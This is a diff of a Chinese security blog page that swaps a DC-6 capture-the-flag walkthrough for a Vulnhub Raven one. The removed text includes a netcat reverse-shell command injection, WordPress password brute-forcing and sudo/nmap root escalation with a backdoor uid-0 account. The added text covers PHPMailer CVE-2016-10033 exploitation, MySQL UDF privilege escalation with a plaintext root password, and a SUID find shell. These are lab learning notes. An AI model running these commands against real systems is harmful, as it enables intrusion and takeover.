@@ -17,7 +17,7 @@
     <meta name="keywords" content="G00dddd">
 
 
-<title>DC-6 | G00d`s Blog</title>
+<title>Vulnhub-3raven | G00d`s Blog</title>
 
 
 
@@ -321,76 +321,11 @@
                 <div class="container">
     
     
-        <div class="post-toc">
-    <div class="tocbot-list">
-    </div>
-    <div class="tocbot-list-menu">
-        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
-        <a onclick="go_top()">Back to top</a>
-        <a onclick="go_bottom()">Go to bottom</a>
-    </div>
-</div>
-
-<script>
-    var tocbot_timer;
-    var DEPTH_MAX = 6; // 为 6 时展开所有
-    var tocbot_default_config = {
-        tocSelector: '.tocbot-list',
-        contentSelector: '.post-content',
-        headingSelector: 'h1, h2, h3, h4, h5',
-        orderedList: false,
-        scrollSmooth: true,
-        onClick: extend_click,
-    };
-
-    function extend_click() {
-        clearTimeout(tocbot_timer);
-        tocbot_timer = setTimeout(function() {
-            tocbot.refresh(obj_merge(tocbot_default_config, {
-                hasInnerContainers: true
-            }));
-        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
-    }
-
-    document.ready(function() {
-        tocbot.init(obj_merge(tocbot_default_config, {
-            collapseDepth: 1
-        }));
-    });
-
-    function expand_toc() {
-        var b = document.querySelector('.tocbot-toc-expand');
-        var expanded = b.getAttribute('data-expanded');
-        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
-        tocbot.refresh(obj_merge(tocbot_default_config, {
-            collapseDepth: expanded ? 1 : DEPTH_MAX
-        }));
-        b.innerText = expanded ? 'Expand all' : 'Collapse all';
-    }
-
-    function go_top() {
-        window.scrollTo(0, 0);
-    }
-
-    function go_bottom() {
-        window.scrollTo(0, document.body.scrollHeight);
-    }
-
-    function obj_merge(target, source) {
-        for (var item in source) {
-            if (source.hasOwnProperty(item)) {
-                target[item] = source[item];
-            }
-        }
-        return target;
-    }
-</script>
-    
 
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">DC-6</h1>
+            <h1 class="post-title">Vulnhub-3raven</h1>
             
                 <div class="post-meta">
                     
@@ -399,7 +334,7 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:06:26</a>
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:04:27</a>
                         </span>
                     
                     
@@ -415,49 +350,75 @@
         </header>
 
         <div class="post-content">
-            <h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><p>第一步信息收集</p>
-<p><img src="/dc-6//1.png" alt="1"></p>
-<p>192.168.213.158</p>
-<p><img src="/dc-6//2.png" alt="2"></p>
-<p>Vi &#x2F;etc&#x2F;hosts 把重定向加上就行了</p>
-<p>接着扫目录发现跟之前打过的靶机有点像</p>
-<p><img src="/dc-6//3.png" alt="3"></p>
-<p><img src="/dc-6//4.png" alt="4"></p>
-<p>用wpscan(专门搜索wordpross漏洞)再看看</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a></p>
-<p><img src="/dc-6//5.png" alt="5"></p>
-<p>用wpscan枚举一下用户名</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> –enumerate u</p>
-<p><img src="/dc-6//6.png" alt="6"></p>
-<p>爆出几个账号,cat &gt; 1.txt 保存一下,然后wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> -U 1.txt -P rockyou.txt</p>
-<p><img src="/dc-6//7.png" alt="7"></p>
-<p>Url&#x2F;wp-login.php 登录后台发现activity monitor</p>
-<p>用searchsploit activity monitor</p>
-<p><img src="/dc-6//8.png" alt="8"></p>
-<p><img src="/dc-6//../../../../%E5%88%B7%E9%A2%98/%E6%9C%AC%E5%9C%B0/vulnhub/media/image9.png"><img src="/dc-6//9.png" alt="9">这里有命令执行,127.0.0.1|nc -e &#x2F;bin&#x2F;bash 192.168.213.137 9999</p>
-<p><img src="/dc-6//10.png" alt="10"></p>
-<p>拿到普通权限</p>
-<p>Python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
-<p>在主机内部找信息</p>
-<p><img src="/dc-6//11.png" alt="11"></p>
-<p>Ssh <a href="mailto:&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;">&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;</a></p>
-<p>提权</p>
-<p><img src="/dc-6//12.png" alt="12"></p>
-<p>我们发现当前账号对backups.sh读写操作</p>
-<p>把shell写入backups</p>
-<p>Echo “&#x2F;bin&#x2F;bash” &gt;&gt; backups.sh</p>
-<p>Sudo -u jens .&#x2F;backups.sh &#x2F;&#x2F;这里用jens执行backups</p>
-<p><img src="/dc-6//13.png" alt="13"></p>
-<p>发现切换账号成功</p>
-<p>Sudo -l发现jens可以用root执行nmap,那就用nmap提权</p>
-<p><img src="/dc-6//14.png" alt="14"></p>
-<p>需要先看nmap的版本号 nmap -v</p>
-<p>然后把shell写入”shell”里,用nmap执行</p>
-<p>echo ‘os.execute(“&#x2F;bin&#x2F;sh”)’ &gt; shell</p>
-<p>sudo nmap –script&#x3D;shell</p>
-<p><img src="/dc-6//15.png" alt="15"></p>
-<p>添加root账号</p>
-<p>useradd -u 0 -o -g 0 -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;root1-m root1</p>
+            <p>sudo arp-scan -l</p>
+<p><img src="/vulnhub-3raven//1.png" alt="1"></p>
+<p>首先查找靶机的地址，访问192.168.253.61</p>
+<p><img src="/vulnhub-3raven//2.png" alt="2"></p>
+<p>这个站有wordpress并且是apache的站</p>
+<p>用nmap扫一下全端口nmap -p- -A 192.168.253.61</p>
+<p><img src="/vulnhub-3raven//3.png" alt="3"></p>
+<p>问了ai关于111端口</p>
+<p>rpcbind 服务，通常用于远程过程调用（RPC）。它的主要功能是将 RPC 请求映射到实际提供服务的程序。</p>
+<p>nikto -host 192.168.253.61 -p 80看下80端口具体有什么</p>
+<img src="/vulnhub-3raven//4.png" alt="4" style="zoom:200%;">
+
+<p>扫描目录通常有2个工具，一个是dirb一个是dirsearch，区别在于前者可以指定字典轻度扫描，后者是深度扫描。在扫描速度上dirb&gt;dirsearch 在扫描深度上dirb&lt;dirsearch</p>
+<p>用dirsearch深度扫描一下目录 dirsearch -u 192.168.215.63，并且一般只用看状态码200就行</p>
+<p><img src="/vulnhub-3raven//5.png" alt="5"></p>
+<p>用wpscan扫描一下Wordpress的漏洞</p>
+<p>wpscan –url 192.168.215.61&#x2F;wordpress -e u,vp,vt –plugins-detection mixed</p>
+<p>发现了wordpress的版本，发现了2个用户名，没有发现任何插件和主题。在wpscan扫描出的更新页面中发现了一张flag3的图片，同时也在readmi发现了flag1</p>
+<p>ok,不做过多周旋，直接找最后的shell，先前用目录扫描工具扫到一个目录&#x2F;vendor&#x2F;README.md 这里面有调用github，也有phpmailer</p>
+<p><img src="/vulnhub-3raven//6.png" alt="6"></p>
+<p><img src="/vulnhub-3raven//7.png" alt="7"></p>
+<p>我联想到 CI&#x2F;CD流程，我们是否能在代码仓库中，控制对应的 CI 管道配置文件，修改 CI 配置文件达到执行命令的目的，那么我们就要去搜索相应的有没有 POC 或者 EXP ； POC 是验证漏洞， EXP 是利用漏洞，我们要利用此漏洞寻找 EXP</p>
+<p>发现版本号是5.2.16，PHPMailer &lt; 5.2.18版本存在安全漏洞，可使未经身份验证的远程攻击者在Web服务器用户上下文中执行任意代码，远程控制目标web应用。</p>
+<p>这个漏洞利用其实挺简单的，就是在发Email中插入shell</p>
+<p>通过searchspolit PHPMailer，使用CVE 2016-10033</p>
+<p>然后searchsploit -p 40974.py找到位置，cp出来，改一点东西</p>
+<p><img src="/vulnhub-3raven//8.png" alt="8"></p>
+<p>kali监听一下，然后访问url&#x2F;contact.php（发邮件的）就能生成shell.php 访问之后就能反弹</p>
+<p><img src="/vulnhub-3raven//9.png" alt="9"></p>
+<p>现在需要提权，有一个新的提权方法，MySQL-UDF提权 UDF（user defind function）用户自定义函数，通过添加新函数，对MySQL的功能进行扩充。调用方式与一般系统自带的函数相同，例如user()，version()等函数。</p>
+<p>udf 文件后缀在windows与linux系统下分别为dll与so，即动态链接库文件，由C、C++编写。以下是提权：</p>
+<p>locate 1518.c</p>
+<p>cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;1518.c .</p>
+<p>5）在kail本地生成so文件，将文件上传到靶机中。</p>
+<p>gcc -g -c 1518.c</p>
+<p>gcc -g -shared -o yugong.so 1518.o -lc</p>
+<p>-g 生成调试信息</p>
+<p>-c 编译（二进制)</p>
+<p>-shared 创建一个动态链接库，输入文件是源文件，汇编文件或者目标文件</p>
+<p>-o 执行命令后的文件名</p>
+<p>-lc -l 库 -c 库名</p>
+<p>6）开始进行udf提权操作，首先需要进入数据库中。</p>
+<p>mysql -uroot -pR@v3nSecurity</p>
+<p>show databases;</p>
+<p>use mysql;</p>
+<p>#进入数据库创建数据表yugong</p>
+<p>create table yugong(line blob);</p>
+<p>插入数据文件：</p>
+<p>insert into yugong values(load_file(‘&#x2F;tmp&#x2F;yugong.so’));</p>
+<p>yugong 表成功插入 二进制数据，然后利用dumpfile函数把文件导出，outfile多行导出，dumpfile一行导出</p>
+<p>outfile会有特殊函数的转换，而dumpfile是原数据导出</p>
+<p>#新建存储函数：</p>
+<p>select*from yugong into dumpfile ‘&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;yugong.so’;</p>
+<p>创建自定义函数 do_system ,类型是integwer。别名(soname)文件名字，然后查询函数是否创建成功:</p>
+<p>create function do_system returns integer soname ‘yugong.so’;</p>
+<p>创建自定义函数 do_system,类型是integer，别名是(soname)文件名字，</p>
+<p>#查询函数是否创建成功</p>
+<p>select * from mysql.func;</p>
+<p>#调用do_system函数来给find命令所有者的suid权限，使其可以执行root命令：</p>
+<p>select do_system(‘chmod u+s &#x2F;usr&#x2F;bin&#x2F;find’);</p>
+<p>7）出现了 0代表执行成功。退出然后执行命令。</p>
+<p>执行find命令</p>
+<p>使用find执行 shell</p>
+<p>touch yugong</p>
+<p>find yugong -exec “&#x2F;bin&#x2F;sh” \</p>
+<p>或者：find yugong -exec “id” \</p>
+<p>cd &#x2F;root</p>
+<p>cat flag4.txt</p>
+<p>flag4{df2bc5e951d91581467bb9a2a8ff4425}</p>
 
         </div>
 
@@ -494,10 +455,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="../dc-7/">DC-7</a>
+                <a class="prev" rel="prev" href="../vulnhub-4troll/">Vulnhub-4Troll</a>
             
             
-            <a class="next" rel="next" href="../dc-5/">DC-5</a>
+            <a class="next" rel="next" href="../vulnhub-1goldeneye/">Vulnhub-1goldeneye</a>
             
         </section>
 
